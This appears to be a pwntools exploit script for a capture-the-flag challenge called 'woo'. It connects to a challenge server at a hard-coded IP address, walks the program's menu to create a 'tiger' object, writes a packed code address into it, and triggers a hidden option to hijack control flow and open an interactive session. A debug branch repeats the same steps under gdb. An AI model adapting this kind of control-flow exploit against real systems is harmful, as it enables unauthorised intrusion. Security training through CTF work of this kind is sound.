from pwn import *

debug = False

if not debug:
	with remote('104.196.15.126', 15050) as p:
		print p.recvuntil('choice:')
		p.sendline('2') # tiger
		print p.recvuntil('want:')
		p.sendline('3') # type
		print p.recvuntil('tiger:')
		p.sendline(p64(0x4008DD))

		# pwnMe
		print p.recvuntil('choice:')
		p.sendline('4919')

		# p.sendline('x/30x *0x6020e0')

		p.interactive()
else:
	p = process(['gdb', '-q', '/home/nscd/tu_ctf/woo'])
	print p.recvuntil('(gdb)')

	# print p.sendline('b *0x400CAA')
	print p.sendline('b *0x400CD9')
	print p.recvuntil('(gdb)')
	p.sendline('r')

	# # make bear
	# print p.recvuntil('choice:')
	# p.sendline('3') # bear
	# print p.recvuntil('want:')
	# p.sendline('2') # type
	# print p.recvuntil('name:')
	# p.sendline('AAAA')

	# make tiger
	# print p.recvuntil('choice:')
	# p.sendline('2') # tiger
	# print p.recvuntil('want:')
	# p.sendline('4') # type
	# print p.recvuntil('tiger:')
	# p.sendline('B'*48 + '\x03')

	# make tiger
	print p.recvuntil('choice:')
	p.sendline('2') # tiger
	print p.recvuntil('want:')
	p.sendline('3') # type
	print p.recvuntil('tiger:')
	p.sendline(p64(0x4008DD))

	# pwnMe
	print p.recvuntil('choice:')
	p.sendline('4919')

	print p.recvuntil('(gdb)')
	p.sendline('x/30x *0x6020e0')

	p.interactive()

	